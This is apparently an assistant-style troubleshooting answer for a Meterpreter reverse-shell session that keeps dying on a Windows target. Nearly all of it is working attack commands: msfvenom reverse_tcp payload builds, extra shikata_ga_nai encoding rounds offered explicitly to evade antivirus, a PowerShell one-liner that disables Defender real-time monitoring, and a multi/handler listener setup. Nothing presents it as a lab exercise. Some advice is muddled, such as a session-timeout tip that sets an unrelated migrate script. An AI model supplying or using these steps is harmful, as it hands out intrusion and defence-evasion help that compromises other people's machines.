If your Meterpreter session keeps closing after execution, there are several potential reasons and fixes you can try:

### 1. **Check if the Payload is Being Blocked**
- **Windows Defender/Antivirus:** Modern Windows security features detect and kill Meterpreter payloads quickly.  
  **Fix:** Disable Defender or add exclusions:  
  ```
  powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
  ```
- **Firewall:** Ensure Windows Firewall is not blocking the connection.

### 2. **Try a Different Payload Encoding**
- `shikata_ga_nai` is often flagged by AV. Try adding more layers of encoding:
  ```
  msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -i 5 -b "\x00" LHOST=10.0.2.42 -f exe > Desktop/Exploit.exe
  ```
  Increase the iterations (`-i 5`) to make it harder to detect.

### 3. **Use a Staged Payload**
If the payload is crashing immediately, try using a staged payload (`windows/meterpreter/reverse_tcp`) instead of a stageless one (`windows/meterpreter_reverse_tcp`):
  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.42 LPORT=4444 -f exe > Exploit.exe
  ```

### 4. **Use an Alternative Listener Configuration**
Set up your Metasploit listener with:
  ```
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST 10.0.2.42
  set LPORT 4444
  set ExitOnSession false
  exploit -j
  ```

### 5. **Run Payload in Compatibility Mode**
On the target machine, try running `Exploit.exe` in **compatibility mode (Windows 7)** and with **admin privileges**.

### 6. **Check for Session Timeouts**
- Ensure your `session-timed-out` value isn't too low:
  ```
  set AutoRunScript post/windows/manage/migrate
  ```

### 7. **Use a Different Payload Format**
Instead of `.exe`, try encoding into a different format, like PowerShell or DLL:
  ```
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.42 LPORT=4444 -f psh-cmd > exploit.ps1
  ```
